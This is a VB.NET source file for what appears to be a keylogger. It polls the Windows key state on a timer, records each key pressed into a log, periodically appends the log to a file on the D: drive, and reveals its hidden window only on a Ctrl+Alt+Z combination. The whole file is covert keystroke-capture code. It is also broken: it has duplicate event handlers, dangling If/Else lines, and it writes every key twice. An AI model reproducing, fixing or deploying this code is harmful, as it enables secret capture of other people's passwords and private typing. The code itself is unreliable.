Option Strict On


Public Class Key
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Int32) As Short

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        tbLog.Text = "Started at: " & Now & vbNewLine
    End Sub






    Private Sub timerKeys_Tick(sender As Object, e As EventArgs) Handles timerKeys.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer
        For i = 2 To 127
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                key = Chr(i)
                If My.Computer.Keyboard.ShiftKeyDown Then
                    If i = 48 Then key = ")" Else 
                    If i = 49 Then key = "!" Else 
                    If i = 50 Then key = "@" Else 
                    If i = 51 Then key = "#" Else 
                    If i = 52 Then key = "$" Else 
                    If i = 53 Then key = "%" Else 
                    If i = 54 Then key = "^" Else 
                    If i = 55 Then key = "&" Else 
                    If i = 56 Then key = "*" Else 
                    If i = 57 Then key = "(" Else 

                End If
                If i = 96 Then key = "0" Else 
                If i = 97 Then key = "1" Else 
                If i = 98 Then key = "2" Else 
                If i = 99 Then key = "3" Else 
                If i = 100 Then key = "4" Else 
                If i = 101 Then key = "5" Else 
                If i = 102 Then key = "6" Else 
                If i = 103 Then key = "7" Else 
                If i = 104 Then key = "8" Else 
                If i = 105 Then key = "9" Else 
                If i = 106 Then key = "*" Else 
                If i = 107 Then key = "+" Else 
                If i = 108 Then key = "Enter" Else 
                If i = 109 Then key = "-" Else 
                If i = 110 Then key = "." Else 
                If i = 111 Then key = "/" Else 
                If i = 112 Then key = "F1" Else 
                If i = 113 Then key = "F2" Else 
                If i = 114 Then key = "F3" Else 
                If i = 115 Then key = "F4" Else 
                If i = 116 Then key = "F5" Else 
                If i = 117 Then key = "F6" Else 
                If i = 118 Then key = "F7" Else 
                If i = 119 Then key = "F8" Else 
                If i = 120 Then key = "F9" Else 
                If i = 121 Then key = "F10" Else 
                If i = 122 Then key = "F11" Else 
                If i = 124 Then key = "F13" Else 
                If i = 125 Then key = "F14" Else 
                If i = 126 Then key = "F15" Else 
                If i = 127 Then key = "F16" Else 
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i
        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                tbLog.Text &= key
            Else
                tbLog.Text &= key.ToLower
            End If
            If My.Computer.Keyboard.ShiftKeyDown Then
                tbLog.Text &= key
            Else
                tbLog.Text &= key.ToLower
            End If
        End If
        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso key = "z" Then
            Me.Show()

        End If




    End Sub

    

    Private Sub timerSave_Tick() Handles timerSave.Tick
        My.Computer.FileSystem.WriteAllText("D:\text.txt", tbLog.Text, True)
    End Sub

    Private Sub timerSave_Tick(sender As Object, e As EventArgs) Handles timerSave.Tick

    End Sub
End Class
